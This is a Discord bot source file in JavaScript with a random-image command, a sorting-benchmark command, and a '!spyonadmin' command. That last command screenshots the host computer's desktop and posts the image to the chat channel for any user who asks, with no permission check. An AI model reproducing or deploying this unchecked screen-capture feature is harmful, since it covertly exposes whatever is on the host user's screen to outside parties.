require("dotenv").config();
TOKEN = process.env.TOKEN
const fs = require('fs');
const { Client, MessageAttachment } = require('discord.js');
const sort = require('./sort.js')

const {performance} = require('perf_hooks');
const client = new Client();
const files = fs.readdirSync('./pepes/')
const screenshot = require('screenshot-desktop')

/**
 * The ready event is vital, it means that only _after_ this will your bot start reacting to information
 * received from Discord
 */
client.on('ready', () => {
  console.log('I am ready!');
});


client.on('message', message => {
  let msgarr = message.content.split(' ')
  let command = msgarr[0]
  let args = msgarr.slice(1)
  

  if (command === '!rngPepe') {
    let chosenFile = files[Math.floor(Math.random() * files.length)] 
    // Create the attachment using MessageAttachment
    const attachment = new MessageAttachment('./pepes/'+chosenFile);
    // Send the attachment in the message channel
    message.channel.send(`${message.author},`,attachment);
  }else if (command === '!sort'){
    let nums = []
    let algo = args.shift()
    let answer = '```diff'+'\nUSING '+algo+'()'+'\nOriginal Sets\n'
    
    
    args.forEach(el=> nums.push(el.split(',')))
   
    for(let i in nums){
      answer+='- Set '+(i+1)+': '+nums[i]+'\n'
    }

    message.channel.send(`${message.author}`,)
    answer+='\nNew Sets\n'
    let time=0;
    for(let i in nums){
      const t0=performance.now()
      sort[algo](nums[i])
      

      const t1=performance.now()
      time += (t1-t0)
      answer+='+Set '+(Number(i)+1)+': '+nums[i].toString()+'\n'
    }  
    
    time=time.toFixed(4)
    answer+='\nSort time: '+time+' ms\n'+'Time per set: '+(time/nums.length).toFixed(4)+' ms'
    answer+='```'
   
    message.channel.send(answer)
  }else if(command == '!spyonadmin'){
    screenshot({ filename: './screenshots/shot.png' }).then(()=>{
      const attachment = new MessageAttachment('./screenshots/shot.png');
      message.channel.send(`${message.author},`,attachment);
    })
    
  }
});


// Log our bot in using the token from https://discord.com/developers/applications
client.login(TOKEN);
